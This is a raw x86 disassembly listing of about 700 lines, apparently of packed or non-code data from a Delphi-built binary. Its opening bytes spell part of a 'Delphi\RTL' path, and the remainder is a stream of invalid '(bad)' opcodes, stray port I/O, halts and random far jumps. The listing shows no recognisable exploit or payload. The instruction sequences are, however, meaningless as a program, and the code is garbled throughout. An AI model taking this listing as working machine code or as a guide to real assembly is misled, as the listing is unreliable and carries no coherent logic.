131591ba:	72 6c                	jb     0x13159228
131591bc:	61                   	popa
131591bd:	6e                   	outsb  %ds:(%esi),(%dx)
131591be:	64 5c                	fs pop %esp
131591c0:	44                   	inc    %esp
131591c1:	65 6c                	gs insb (%dx),%es:(%edi)
131591c3:	70 68                	jo     0x1315922d
131591c5:	69 5c 52 54 4c 00 46 	imul   $0x5046004c,0x54(%edx,%edx,2),%ebx
131591cc:	50 
131591cd:	55                   	push   %ebp
131591ce:	4d                   	dec    %ebp
131591cf:	61                   	popa
131591d0:	f1                   	int1
131591d1:	fe                   	(bad)
131591d2:	e1 17                	loope  0x131591eb
131591d4:	22 56 61             	and    0x61(%esi),%dl
131591d7:	6c                   	insb   (%dx),%es:(%edi)
131591d8:	75 65                	jne    0x1315923f
131591da:	98                   	cwtl
131591db:	db e3                	fninit
131591dd:	9b d9 2d 39 0b fd b6 	fldcw  0xb6fd0b39
131591e4:	c9                   	leave
131591e5:	1f                   	pop    %ds
131591e6:	31 07                	xor    %eax,(%edi)
131591e8:	b2 da                	mov    $0xda,%dl
131591ea:	08 ff                	or     %bh,%bh
131591ec:	51                   	push   %ecx
131591ed:	fc                   	cld
131591ee:	c3                   	ret
131591ef:	06                   	push   %es
131591f0:	1c 5b                	sbb    $0x5b,%al
131591f2:	bc 7b 77 14 01       	mov    $0x114777b,%esp
131591f7:	76 11                	jbe    0x1315920a
131591f9:	9c                   	pushf
131591fa:	9e                   	sahf
131591fb:	df fa                	(bad)
131591fd:	ed                   	in     (%dx),%eax
131591fe:	0e                   	push   %cs
131591ff:	41                   	inc    %ecx
13159200:	10 ed                	adc    %ch,%ch
13159202:	85 59 33             	test   %ebx,0x33(%ecx)
13159205:	f7 1b                	negl   (%ebx)
13159207:	0e                   	push   %cs
13159208:	17                   	pop    %ss
13159209:	50                   	push   %eax
1315920a:	50                   	push   %eax
1315920b:	52                   	push   %edx
1315920c:	0b 49 36             	or     0x36(%ecx),%ecx
1315920f:	03 5f 1d             	add    0x1d(%edi),%ebx
13159212:	e4 10                	in     $0x10,%al
13159214:	08 03                	or     %al,(%ebx)
13159216:	d2 6c 87 58          	shrb   %cl,0x58(%edi,%eax,4)
1315921a:	9b                   	fwait
1315921b:	17                   	pop    %ss
1315921c:	01 e0                	add    %esp,%eax
1315921e:	04 de                	add    $0xde,%al
13159220:	ee                   	out    %al,(%dx)
13159221:	c3                   	ret
13159222:	22 57 07             	and    0x7(%edi),%dl
13159225:	50                   	push   %eax
13159226:	53                   	push   %ebx
13159227:	cd 1d                	int    $0x1d
13159229:	e4 13                	in     $0x13,%al
1315922b:	6e                   	outsb  %ds:(%esi),(%dx)
1315922c:	ff 46 86             	incl   -0x7a(%esi)
1315922f:	09 35 41 01 80 39    	or     %esi,0x39800141
13159235:	e9 74 0c 04 eb       	jmp    0xfe199eae
1315923a:	75 ee                	jne    0x1315922a
1315923c:	0d f8 a5 94 be       	or     $0xbe94a5f8,%eax
13159241:	c0 41 41 eb          	rolb   $0xeb,0x41(%ecx)
13159245:	81 05 01 c1 97 9c 7d 	addl   $0x3361c67d,0x9c97c101
1315924c:	c6 61 33 
1315924f:	1d b4 1e 10 51       	sbb    $0x51101eb4,%eax
13159254:	5d                   	pop    %ebp
13159255:	e1 fb                	loope  0x13159252
13159257:	cd 1c                	int    $0x1c
13159259:	93                   	xchg   %eax,%ebx
1315925a:	59                   	pop    %ecx
1315925b:	c4 97 27 12 52 1f    	les    0x1f521227(%edi),%edx
13159261:	61                   	popa
13159262:	2e 26 39 e2          	cs es cmp %esp,%edx
13159266:	5a                   	pop    %edx
13159267:	bb 1d 29 77 d9       	mov    $0xd977291d,%ebx
1315926c:	d9 10                	fsts   (%eax)
1315926e:	b2 e3                	mov    $0xe3,%dl
13159270:	1c 58                	sbb    $0x58,%al
13159272:	63 0a                	arpl   %ecx,(%edx)
13159274:	a8 06                	test   $0x6,%al
13159276:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
13159277:	f8                   	clc
13159278:	f7 40 04 85 4a df a2 	testl  $0xa2df4a85,0x4(%eax)
1315927f:	e4 ee                	in     $0xee,%al
13159281:	36 81 38 de 21 11 13 	cmpl   $0x131121de,%ss:(%eax)
13159288:	48                   	dec    %eax
13159289:	14 74                	adc    $0x74,%al
1315928b:	6e                   	outsb  %ds:(%esi),(%dx)
1315928c:	72 25                	jb     0x131592b3
1315928e:	d8 00                	fadds  (%eax)
13159290:	29 1d 8c 50 2f 2d    	sub    %ebx,0x2d2f508c
13159296:	38 1b                	cmp    %bl,(%ebx)
13159298:	14 82                	adc    $0x82,%al
1315929a:	44                   	inc    %esp
1315929b:	f1                   	int1
1315929c:	f6 94 a3 5e 6d 09 e7 	notb   -0x18f692a2(%ebx,%eiz,4)
131592a3:	6c                   	insb   (%dx),%es:(%edi)
131592a4:	c0 e8 de             	shr    $0xde,%al
131592a7:	06                   	push   %es
131592a8:	df 64 81 39          	fbld   0x39(%ecx,%eax,4)
131592ac:	ce                   	into
131592ad:	fa                   	cli
131592ae:	ef                   	out    %eax,(%dx)
131592af:	76 37                	jbe    0x131592e8
131592b1:	2c b5                	sub    $0xb5,%al
131592b3:	20 99 e8 20 7c 25    	and    %bl,0x257c20e8(%ecx)
131592b9:	76 29                	jbe    0x131592e4
131592bb:	2e 77 20             	ja,pn  0x131592de
131592be:	4c                   	dec    %esp
131592bf:	66 bb ec 28          	mov    $0x28ec,%bx
131592c3:	20 60 00             	and    %ah,0x0(%eax)
131592c6:	64 00 58 3b          	add    %bl,%fs:0x3b(%eax)
131592ca:	ab                   	stos   %eax,%es:(%edi)
131592cb:	ac                   	lods   %ds:(%esi),%al
131592cc:	55                   	push   %ebp
131592cd:	7a d4                	jp     0x131592a3
131592cf:	89 c2                	mov    %eax,%edx
131592d1:	7f 4f                	jg     0x13159322
131592d3:	15 0a 1a 87 7c       	adc    $0x7c871a0a,%eax
131592d8:	96                   	xchg   %eax,%esi
131592d9:	3a 01                	cmp    (%ecx),%al
131592db:	76 1e                	jbe    0x131592fb
131592dd:	15 27 a7 61 5b       	adc    $0x5b61a727,%eax
131592e2:	89 55 fd             	mov    %edx,-0x3(%ebp)
131592e5:	50                   	push   %eax
131592e6:	3c b4                	cmp    $0xb4,%al
131592e8:	05 30 b0 c0 70       	add    $0x70c0b030,%eax
131592ed:	83 cd 02             	or     $0x2,%ebp
131592f0:	07                   	pop    %es
131592f1:	29 bb 89 ce f0 64    	sub    %edi,0x64f0ce89(%ebx)
131592f7:	8b 1b                	mov    (%ebx),%ebx
131592f9:	53                   	push   %ebx
131592fa:	1c 87                	sbb    $0x87,%al
131592fc:	28 35 68 70 2f 34    	sub    %dh,0x342f7068
13159302:	d2 46 99             	rolb   %cl,-0x67(%esi)
13159305:	6d                   	insl   (%dx),%es:(%edi)
13159306:	52                   	push   %edx
13159307:	dc 14 61             	fcoml  (%ecx,%eiz,2)
1315930a:	28 88 ee ff f7 3d    	sub    %cl,0x3df7ffee(%eax)
13159310:	ff b0 00 6d a0 05    	push   0x5a06d00(%eax)
13159316:	8b 6f 08             	mov    0x8(%edi),%ebp
13159319:	8b 5f 04             	mov    0x4(%edi),%ebx
1315931c:	c7 47 04 9c 28 28 c6 	movl   $0xc628289c,0x4(%edi)
13159323:	52                   	push   %edx
13159324:	ef                   	out    %eax,(%dx)
13159325:	83 c3 05             	add    $0x5,%ebx
13159328:	af                   	scas   %es:(%edi),%eax
13159329:	29 e3                	sub    %esp,%ebx
1315932b:	5e                   	pop    %esi
1315932c:	c3                   	ret
1315932d:	b1 c7                	mov    $0xc7,%cl
1315932f:	ce                   	into
13159330:	1c 88                	sbb    $0x88,%al
13159332:	26 11 89 90 07 41 08 	adc    %ecx,%es:0x8410790(%ecx)
13159339:	ab                   	stos   %eax,%es:(%edi)
1315933a:	9c                   	pushf
1315933b:	6a c2                	push   $0xffffffc2
1315933d:	e9 98 b8 41 2b       	jmp    0x3e574bda
13159342:	30 84 79 fb 20 2f 74 	xor    %al,0x742f20fb(%ecx,%edi,2)
13159349:	1f                   	pop    %ds
1315934a:	8b 4a 4c             	mov    0x4c(%edx),%ecx
1315934d:	42                   	inc    %edx
1315934e:	04 f4                	add    $0xf4,%al
13159350:	53                   	push   %ebx
13159351:	3f                   	aas
13159352:	18 3e                	sbb    %bh,(%esi)
13159354:	de 6a 08             	fisubrs 0x8(%edx)
13159357:	b9 a8 30 ff d1       	mov    $0xd1ff30a8,%ecx
1315935c:	f2 59                	repnz pop %ecx
1315935e:	bb 1d b0 37 30       	mov    $0x3037b01d,%ebx
13159363:	c7                   	(bad)
13159364:	33 47 30             	xor    0x30(%edi),%eax
13159367:	27                   	daa
13159368:	65 13 fe             	gs adc %esi,%edi
1315936b:	d9 b3 5d 0a 89 6d    	fnstenv 0x6d890a5d(%ebx)
13159371:	42                   	inc    %edx
13159372:	0c 83                	or     $0x83,%al
13159374:	60                   	pusha
13159375:	04 fd                	add    $0xfd,%al
13159377:	77 2a                	ja     0x131593a3
13159379:	f0 7d db             	lock jge 0x13159357
1315937c:	74 0d                	je     0x1315938b
1315937e:	0e                   	push   %cs
1315937f:	08 96 98 04 a4 c7    	or     %dl,-0x385bfb68(%esi)
13159385:	b1 ec                	mov    $0xec,%cl
13159387:	6f                   	outsl  %ds:(%esi),(%dx)
13159388:	2d 36 e4 10 59       	sub    $0x5910e436,%eax
1315938d:	8b 12                	mov    (%edx),%edx
1315938f:	89 11                	mov    %edx,(%ecx)
13159391:	52                   	push   %edx
13159392:	f2 67 09 cc          	repnz addr16 or %ecx,%esp
13159396:	3b 48 39             	cmp    0x39(%eax),%ecx
13159399:	5a                   	pop    %edx
1315939a:	8b 64 24 2c          	mov    0x2c(%esp),%esp
1315939e:	46                   	inc    %esi
1315939f:	7f 1b                	jg     0x131593bc
131593a1:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
131593a2:	47                   	inc    %edi
131593a3:	92                   	xchg   %eax,%edx
131593a4:	5d                   	pop    %ebp
131593a5:	8e 58 ff             	mov    -0x1(%eax),%ds
131593a8:	e2 ae                	loop   0x13159358
131593aa:	36 77 28             	ss ja  0x131593d5
131593ad:	c3                   	ret
131593ae:	d2 a8 6c a3 19 02    	shrb   %cl,0x219a36c(%eax)
131593b4:	b7 92                	mov    $0x92,%bh
131593b6:	e9 dd a1 c2 0c       	jmp    0x1fd83598
131593bb:	9b                   	fwait
131593bc:	cb                   	lret
131593bd:	4b                   	dec    %ebx
131593be:	17                   	pop    %ss
131593bf:	02 3d cc 7f bf 8b    	add    0x8bbf7fcc,%bh
131593c5:	92                   	xchg   %eax,%edx
131593c6:	ed                   	in     (%dx),%eax
131593c7:	7f 2c                	jg     0x131593f5
131593c9:	74 5c                	je     0x13159427
131593cb:	3d 8e 08 15 74       	cmp    $0x7415088e,%eax
131593d0:	57                   	push   %edi
131593d1:	2d 05 d5 2f f4       	sub    $0xf42fd505,%eax
131593d6:	dd 0f                	fisttpll (%edi)
131593d8:	2d 87 ea 3d 3e       	sub    $0x3e3dea87,%eax
131593dd:	4e                   	dec    %esi
131593de:	eb 60                	jmp    0x13159440
131593e0:	05 71 6e df ff       	add    $0xffdf6e71,%eax
131593e5:	b2 56                	mov    $0x56,%dl
131593e7:	3f                   	aas
131593e8:	02 72 36             	add    0x36(%edx),%dh
131593eb:	74 30                	je     0x1315941d
131593ed:	eb 52                	jmp    0x13159441
131593ef:	3d 96 29 11 1b       	cmp    $0x1b112996,%eax
131593f4:	2d 93 ed fb 6d       	sub    $0x6dfbed93,%eax
131593f9:	fb                   	sti
131593fa:	29 2e                	sub    %ebp,(%esi)
131593fc:	22 13                	and    (%ebx),%dl
131593fe:	02 24 eb             	add    (%ebx,%ebp,8),%ah
13159401:	3a 2d fd 0e 2f 27    	cmp    0x272f0efd,%ch
13159407:	f7 5f e8             	negl   -0x18(%edi)
1315940a:	ff                   	(bad)
1315940b:	3d 74 26 eb 2c       	cmp    $0x2ceb2674,%eax
13159410:	b0 c8                	mov    $0xc8,%al
13159412:	eb 2a                	jmp    0x1315943e
13159414:	b0 c9                	mov    $0xc9,%al
13159416:	f4                   	hlt
13159417:	b0 cd                	mov    $0xcd,%al
13159419:	eb 22                	jmp    0x1315943d
1315941b:	b0 cf                	mov    $0xcf,%al
1315941d:	eb 1e                	jmp    0x1315943d
1315941f:	0f 89 25 be 44 1a    	jns    0x2d5a524a
13159425:	d7                   	xlat   %ds:(%ebx)
13159426:	eb 16                	jmp    0x1315943e
13159428:	b0 ce                	mov    $0xce,%al
1315942a:	05 b0 09 4a 71       	add    $0x714a09b0,%eax
1315942f:	83 7f 0e b0          	cmpl   $0xffffffb0,0xe(%edi)
13159433:	da eb                	(bad)
13159435:	0a b0 d9 43 b0 ca    	or     -0x354fbc27(%eax),%dh
1315943b:	5a                   	pop    %edx
1315943c:	eb 48                	jmp    0x13159486
1315943e:	fd                   	std
1315943f:	b6 91                	mov    $0x91,%dh
13159441:	ff c8                	dec    %eax
13159443:	52                   	push   %edx
13159444:	0c 88                	or     $0x88,%al
13159446:	5d                   	pop    %ebp
13159447:	c2 2d c3             	ret    $0xc32d
1315944a:	70 13                	jo     0x1315945f
1315944c:	46                   	inc    %esi
1315944d:	9f                   	lahf
1315944e:	89 05 1a f1 4e c6    	mov    %eax,0xc64ef11a
13159454:	a3 0f 43 17 74       	mov    %eax,0x7417430f
13159459:	71 28                	jno    0x13159483
1315945b:	5c                   	pop    %esp
1315945c:	f2 e9 98 ad 0d 08    	bnd jmp 0x1b2341fa
13159462:	7e 31                	jle    0x13159495
13159464:	5c                   	pop    %esp
13159465:	78 89                	js     0x131593f0
13159467:	63 74 a4 3b          	arpl   %esi,0x3b(%esp,%eiz,4)
1315946b:	d8 53 14             	fcoms  0x14(%ebx)
1315946e:	b3 18                	mov    $0x18,%bl
13159470:	74 1d                	je     0x1315948f
13159472:	67 dc a0 cb d2       	fsubl  -0x2d35(%bx,%si)
13159477:	fa                   	cli
13159478:	ab                   	stos   %eax,%es:(%edi)
13159479:	89 d8                	mov    %ebx,%eax
1315947b:	d4 ee                	aam    $0xee
1315947d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
1315947e:	f7 5f 73             	negl   0x73(%edi)
13159481:	0b 21                	or     (%ecx),%esp
13159483:	7d 1e                	jge    0x131594a3
13159485:	74 8b                	je     0x13159412
13159487:	0d 04 21 a3 56       	or     $0x56a32104,%eax
1315948c:	7f 3f                	jg     0x131594cd
1315948e:	0c 2b                	or     $0x2b,%al
13159490:	e4 b8                	in     $0xb8,%al
13159492:	d9 9a 51 14 89 16    	fstps  0x16891451(%edx)
13159498:	57                   	push   %edi
13159499:	e1 50                	loope  0x131594eb
1315949b:	38 25 34 61 87 57    	cmp    %ah,0x57876134
131594a1:	cd 1a                	int    $0x1a
131594a3:	0a 86 05 a1 0a 52    	or     0x520aa105(%esi),%al
131594a9:	6e                   	outsb  %ds:(%esi),(%dx)
131594aa:	e4 38                	in     $0x38,%al
131594ac:	37                   	aaa
131594ad:	66 a0 ef 74 89 68    	data16 mov 0x688974ef,%al
131594b3:	08 a3 24 0e 1f a1    	or     %ah,-0x5ee0f1dc(%ebx)
131594b9:	0a b8 85 bb ae 62    	or     0x62aebb85(%eax),%bh
131594bf:	1c 25                	sbb    $0x25,%al
131594c1:	39 c8                	cmp    %ecx,%eax
131594c3:	75 6b                	jne    0x13159530
131594c5:	00 2b                	add    %ch,(%ebx)
131594c7:	fb                   	sti
131594c8:	85 1a                	test   %ebx,(%edx)
131594ca:	2c 79                	sub    $0x79,%al
131594cc:	09 3a                	or     %edi,(%edx)
131594ce:	49                   	dec    %ecx
131594cf:	08 39                	or     %bh,(%ecx)
131594d1:	01 75 f5             	add    %esi,-0xb(%ebp)
131594d4:	10 62 87             	adc    %ah,-0x79(%edx)
131594d7:	c1 55 ca 87          	rcll   $0x87,-0x36(%ebp)
131594db:	43                   	inc    %ebx
131594dc:	bf 20 b8 d4 e8       	mov    $0xe8d4b820,%edi
131594e1:	be ca 08 2e 48       	mov    $0x482e08ca,%esi
131594e6:	a9 5b 70 04 df       	test   $0xdf04705b,%eax
131594eb:	22 c8                	and    %al,%cl
131594ed:	0e                   	push   %cs
131594ee:	0c 66                	or     $0x66,%al
131594f0:	32 93 7e 12 4b 89    	xor    -0x76b4ed82(%ebx),%dl
131594f6:	b8 6d af 76 18       	mov    $0x1876af6d,%eax
131594fb:	44                   	inc    %esp
131594fc:	de 18                	ficomps (%eax)
131594fe:	99                   	cltd
131594ff:	d0 11                	rclb   $1,(%ecx)
13159501:	7f ee                	jg     0x131594f1
13159503:	dd ae c0 10 35 f3    	(bad) -0xccaef40(%esi)
13159509:	98                   	cwtl
1315950a:	1e                   	push   %ds
1315950b:	94                   	xchg   %eax,%esp
1315950c:	bd 22 d0 d1 05       	mov    $0x5d1d022,%ebp
13159511:	bb 1c 04 1f f8       	mov    $0xf81f041c,%ebx
13159516:	e6 4c                	out    %al,$0x4c
13159518:	35 5d 02 7c f6       	xor    $0xf67c025d,%eax
1315951d:	3b b3 5f a1 28 8b    	cmp    -0x74d75ea1(%ebx),%esi
13159523:	4b                   	dec    %ebx
13159524:	8b 30                	mov    (%eax),%esi
13159526:	8e 2f                	mov    (%edi),%gs
13159528:	3c c9                	cmp    $0xc9,%al
1315952a:	d8 78 5d             	fdivrs 0x5d(%eax)
1315952d:	c6                   	(bad)
1315952e:	3b f3                	cmp    %ebx,%esi
13159530:	7e 1c                	jle    0x1315954e
13159532:	04 df                	add    $0xdf,%al
13159534:	43                   	inc    %ebx
13159535:	00 e4                	add    %ah,%ah
13159537:	dd ec                	fucomp %st(4)
13159539:	89 1d 2c 26 5f 3b    	mov    %ebx,0x3b5f262c
1315953f:	f3 7f ec             	repz jg 0x1315952e
13159542:	b6 46                	mov    $0x46,%dh
13159544:	f0 f5                	lock cmc
13159546:	c7 05 52 40 e5 09 14 	movl   $0xb048bf14,0x9e54052
1315954d:	bf 48 b0 
13159550:	69 50 a3 28 c4 4d 89 	imul   $0x894dc428,-0x5d(%eax),%edx
13159557:	15 7c e7 2e bd       	adc    $0xbd2ee77c,%eax
1315955c:	30 da                	xor    %bl,%dl
1315955e:	2d a3 1c 1d 38       	sub    $0x381d1ca3,%eax
13159563:	21 d4                	and    %edx,%esp
13159565:	c6 05 24 da 8f 3e 03 	movb   $0x3,0x3e8fda24
1315956c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
1315956d:	4e                   	dec    %esi
1315956e:	7c 0b                	jl     0x1315957b
13159570:	18 8d ee ea 97 06    	sbb    %cl,0x697eaee(%ebp)
13159576:	ab                   	stos   %eax,%es:(%edi)
13159577:	e5 2a                	in     $0x2a,%eax
13159579:	4a                   	dec    %edx
1315957a:	c6                   	(bad)
1315957b:	08 4b 75             	or     %cl,0x75(%ebx)
1315957e:	f0 12 d0             	lock adc %al,%dl
13159581:	70 b0                	jo     0x13159533
13159583:	e3 be                	jecxz  0x13159543
13159585:	64 f4                	fs hlt
13159587:	b1 22                	mov    $0x22,%cl
13159589:	77 c4                	ja     0x1315954f
1315958b:	57                   	push   %edi
1315958c:	8d 59 b2             	lea    -0x4e(%ecx),%ebx
1315958f:	bf 08 99 f7 ff       	mov    $0xfff79908,%edi
13159594:	27                   	daa
13159595:	db 17                	fistl  (%edi)
13159597:	e0 80                	loopne 0x13159519
13159599:	c2 30 b8             	ret    $0xb830
1315959c:	c1 88 14 06 13 bb fb 	rorl   $0xfb,-0x44ecf9ec(%eax)
131595a3:	ea 6f c0 12 1a 49 97 	ljmp   $0x9749,$0x1a12c06f
131595aa:	db b1 1c a1 04 c0    	(bad) -0x3ffb5ee4(%ecx)
131595b0:	dd dc                	fstp   %st(4)
131595b2:	2d 1e 01 e2 88       	sub    $0x88e2011e,%eax
131595b7:	92                   	xchg   %eax,%edx
131595b8:	84 0a                	test   %cl,(%edx)
131595ba:	f1                   	int1
131595bb:	8a d9                	mov    %cl,%bl
131595bd:	22 41 07             	and    0x7(%ecx),%al
131595c0:	bf 29 1e c1 e8       	mov    $0xe8c11e29,%edi
131595c5:	04 49                	add    $0x49,%al
131595c7:	9a e6 93 4b 3c d4 16 	lcall  $0x16d4,$0x3c4b93e6
131595ce:	c5 87 6d 43 d8 16    	lds    0x16d8436d(%edi),%eax
131595d4:	40                   	inc    %eax
131595d5:	be fd d6 09 7e       	mov    $0x7e09d6fd,%esi
131595da:	5f                   	pop    %edi
131595db:	fa                   	cli
131595dc:	6f                   	outsl  %ds:(%esi),(%dx)
131595dd:	14 ff                	adc    $0xff,%al
131595df:	77 1c                	ja     0x131595fd
131595e1:	02 20                	add    (%eax),%ah
131595e3:	8b 37                	mov    (%edi),%esi
131595e5:	b9 70 d2 b6 21       	mov    $0x21b6d270,%ecx
131595ea:	e4 f3                	in     $0xf3,%al
131595ec:	a5                   	movsl  %ds:(%esi),%es:(%edi)
131595ed:	2c c9                	sub    $0xc9,%al
131595ef:	2f                   	das
131595f0:	51                   	push   %ecx
131595f1:	17                   	pop    %ss
131595f2:	b7 78                	mov    $0x78,%bh
131595f4:	6e                   	outsb  %ds:(%esi),(%dx)
131595f5:	04 34                	add    $0x34,%al
131595f7:	d0 57 51             	rclb   $1,0x51(%edi)
131595fa:	3d 08 97 17 bf       	cmp    $0xbf179708,%eax
131595ff:	be 21 ec 14 83       	mov    $0x8314ec21,%esi
13159604:	3d 10 d2 f2 0b       	cmp    $0xbf2d210,%eax
13159609:	b8 a9 3d 58 b9       	mov    $0xb9583da9,%eax
1315960e:	8d 72 20             	lea    0x20(%edx),%esi
13159611:	05 e4 6a 1e 68       	add    $0x681e6ae4,%eax
13159616:	6c                   	insb   (%dx),%es:(%edi)
13159617:	56                   	push   %esi
13159618:	41                   	inc    %ecx
13159619:	ea ba 3d eb 1a 76 30 	ljmp   $0x3076,$0x1aeb3dba
13159620:	24 3f                	and    $0x3f,%al
13159622:	02 68 50             	add    0x50(%eax),%ch
13159625:	34 5a                	xor    $0x5a,%al
13159627:	80 24 c0 33          	andb   $0x33,(%eax,%eax,8)
1315962b:	d7                   	xlat   %ds:(%ebx)
1315962c:	c0 0b 19             	rorb   $0x19,(%ebx)
1315962f:	ab                   	stos   %eax,%es:(%edi)
13159630:	5c                   	pop    %esp
13159631:	09 3e                	or     %edi,(%esi)
13159633:	84 2b                	test   %ch,(%ebx)
13159635:	50                   	push   %eax
13159636:	be 00 1d 7c 7c       	mov    $0x7c7c1d00,%esi
1315963b:	00 fd                	add    %bh,%ch
1315963d:	be 2f f7 e6 0d       	mov    $0xde6f72f,%esi
13159642:	ed                   	in     (%dx),%eax
13159643:	74 bb                	je     0x13159600
13159645:	b2 be                	mov    $0xbe,%dl
13159647:	c1 bf 30 1b b4 bd dd 	sarl   $0xdd,-0x424be4d0(%edi)
1315964e:	97                   	xchg   %eax,%edi
1315964f:	80 7b 28 3a          	cmpb   $0x3a,0x28(%ebx)
13159653:	16                   	push   %ss
13159654:	83 3f 9f             	cmpl   $0xffffff9f,(%edi)
13159657:	11 3e                	adc    %edi,(%esi)
13159659:	d0 d0                	rcl    $1,%al
1315965b:	76 bf                	jbe    0x1315961c
1315965d:	00 48 17             	add    %cl,0x17(%eax)
13159660:	8b e8                	mov    %eax,%ebp
13159662:	ff d5                	call   *%ebp
13159664:	10 75 ef             	adc    %dh,-0x11(%ebp)
13159667:	a5                   	movsl  %ds:(%esi),%es:(%edi)
13159668:	67 f8                	addr16 clc
1315966a:	76 ee                	jbe    0x1315965a
1315966c:	10 19                	adc    %bl,(%ecx)
1315966e:	4b                   	dec    %ebx
1315966f:	23 38                	and    (%eax),%edi
13159671:	04 c4                	add    $0xc4,%al
13159673:	9c                   	pushf
13159674:	13 34 05 4b b9 35 bb 	adc    -0x44ca46b5(,%eax,1),%esi
1315967b:	0a 1f                	or     (%edi),%bl
1315967d:	05 05 5c 84 03       	add    $0x3845c05,%eax
13159682:	e3 e1                	jecxz  0x13159665
13159684:	14 89                	adc    $0x89,%al
13159686:	5d                   	pop    %ebp
13159687:	c7                   	(bad)
13159688:	31 80 05 8e 43 10    	xor    %eax,0x10438e05(%eax)
1315968e:	0d 1a 16 36 a3       	or     $0xa336161a,%eax
13159693:	c2 0b 1b             	ret    $0x1b0b
13159696:	20 53 85             	and    %dl,-0x7b(%ebx)
13159699:	42                   	inc    %edx
1315969a:	10 3b                	adc    %bh,(%ebx)
1315969c:	c8 bc 7d 76          	enter  $0x7dbc,$0x76
131596a0:	63 5d 13             	arpl   %ebx,0x13(%ebp)
131596a3:	06                   	push   %es
131596a4:	b6 84                	mov    $0x84,%dh
131596a6:	30 21                	xor    %ah,(%ecx)
131596a8:	f4                   	hlt
131596a9:	75 03                	jne    0x131596ae
131596ab:	b2 fd                	mov    $0xfd,%dl
131596ad:	fd                   	std
131596ae:	1c eb                	sbb    $0xeb,%al
131596b0:	84 74 05 60          	test   %dh,0x60(%ebp,%eax,1)
131596b4:	94                   	xchg   %eax,%esp
131596b5:	83 3b 78             	cmpl   $0x78,(%ebx)
131596b8:	17                   	pop    %ss
131596b9:	9a 9d a5 e7 18 d0 06 	lcall  $0x6d0,$0x18e7a59d
131596c0:	8c 18                	mov    %ds,(%eax)
131596c2:	34 31                	xor    $0x31,%al
131596c4:	08 5d 5c             	or     %bl,0x5c(%ebp)
131596c7:	60                   	pusha
131596c8:	03 56 91             	add    -0x6f(%esi),%edx
131596cb:	fb                   	sti
131596cc:	61                   	popa
131596cd:	5e                   	pop    %esi
131596ce:	d8 bd 87 d8 5b 24    	fdivrs 0x245bd887(%ebp)
131596d4:	99                   	cltd
131596d5:	29 a3 ce 22 24 50    	sub    %esp,0x502422ce(%ebx)
131596db:	05 4e 13 dc 57       	add    $0x57dc134e,%eax
131596e0:	8f 05 df e9 07 fd    	pop    0xfd07e9df
131596e6:	63 bd 05 05 1c c7    	arpl   %edi,-0x38e3fafb(%ebp)
131596ec:	00 ec                	add    %ch,%ah
131596ee:	4a                   	dec    %edx
131596ef:	f8                   	clc
131596f0:	49                   	dec    %ecx
131596f1:	7c 10                	jl     0x13159703
131596f3:	f0 ff f0             	lock push %eax
131596f6:	c7 06 ad 06 b8 24    	movl   $0x24b806ad,(%esi)
131596fc:	42                   	inc    %edx
131596fd:	8a 14 e4             	mov    (%esp,%eiz,8),%dl
13159700:	58                   	pop    %eax
13159701:	72 77                	jb     0x1315977a
13159703:	a1 1d 6b 89 c3       	mov    0xc3896b1d,%eax
13159708:	ed                   	in     (%dx),%eax
13159709:	8b 13                	mov    (%ebx),%edx
1315970b:	29 1a                	sub    %ebx,(%edx)
1315970d:	c7 03 05 86 8d 4c    	movl   $0x4c8d8605,(%ebx)
13159713:	0e                   	push   %cs
13159714:	08 28                	or     %ch,(%eax)
13159716:	fb                   	sti
13159717:	e0 ae                	loopne 0x131596c7
13159719:	3b f4                	cmp    %esp,%esi
1315971b:	04 4e                	add    $0x4e,%al
1315971d:	75 da                	jne    0x131596f9
1315971f:	03 27                	add    (%edi),%esp
13159721:	24 21                	and    $0x21,%al
13159723:	41                   	inc    %ecx
13159724:	7f 1a                	jg     0x13159740
13159726:	b6 c1                	mov    $0xc1,%dh
13159728:	af                   	scas   %es:(%edi),%eax
13159729:	d6                   	salc
1315972a:	47                   	inc    %edi
1315972b:	d7                   	xlat   %ds:(%ebx)
1315972c:	40                   	inc    %eax
1315972d:	25 d8 8f 58 0b       	and    $0xb588fd8,%eax
13159732:	a5                   	movsl  %ds:(%esi),%es:(%edi)
13159733:	1a c4                	sbb    %ah,%al
13159735:	ea 48 fc 4f 6f 09 0d 	ljmp   $0xd09,$0x6f4ffc48
1315973c:	b0 6f                	mov    $0x6f,%al
1315973e:	6b 3b 36             	imul   $0x36,(%ebx),%edi
13159741:	87 7b 14             	xchg   %edi,0x14(%ebx)
13159744:	4b                   	dec    %ebx
13159745:	fa                   	cli
13159746:	bb 70 db 43 c0       	mov    $0xc043db70,%ebx
1315974b:	7e aa                	jle    0x131596f7
1315974d:	83 c0 40             	add    $0x40,%eax
13159750:	e0 fe                	loopne 0x13159750
13159752:	d9 14 c4             	fsts   (%esp,%eax,8)
13159755:	5a                   	pop    %edx
13159756:	7e 6b                	jle    0x131597c3
13159758:	04 b7                	add    $0xb7,%al
1315975a:	bc 44 02 c9 13       	mov    $0x13c90244,%esp
1315975f:	08 5a 89             	or     %bl,-0x77(%edx)
13159762:	50                   	push   %eax
13159763:	fc                   	cld
13159764:	00 57 04             	add    %dl,0x4(%edi)
13159767:	b6 16                	mov    $0x16,%dh
13159769:	f8                   	clc
1315976a:	b6 31                	mov    $0x31,%dh
1315976c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
1315976d:	ce                   	into
1315976e:	fe                   	(bad)
1315976f:	39 8b a0 89 cf 89    	cmp    %ecx,-0x76307660(%ebx)
13159775:	f8                   	clc
13159776:	6b f9 f0             	imul   $0xfffffff0,%ecx,%edi
13159779:	5a                   	pop    %edx
1315977a:	b1 5b                	mov    $0x5b,%cl
1315977c:	57                   	push   %edi
1315977d:	19 09                	sbb    %ecx,(%ecx)
1315977f:	73 89                	jae    0x1315970a
13159781:	f0 70 8a             	lock jo 0x1315970e
13159784:	28 0c 23             	sub    %cl,(%ebx,%eiz,1)
13159787:	fe                   	(bad)
13159788:	17                   	pop    %ss
13159789:	40                   	inc    %eax
1315978a:	89 3b                	mov    %edi,(%ebx)
1315978c:	33 fc                	xor    %esp,%edi
1315978e:	37                   	aaa
1315978f:	e0 42                	loopne 0x131597d3
13159791:	0e                   	push   %cs
13159792:	54                   	push   %esp
13159793:	0d 08 50 5d a1       	or     $0xa15d5008,%eax
13159798:	a8 4e                	test   $0x4e,%al
1315979a:	07                   	pop    %es
1315979b:	9e                   	sahf
1315979c:	55                   	push   %ebp
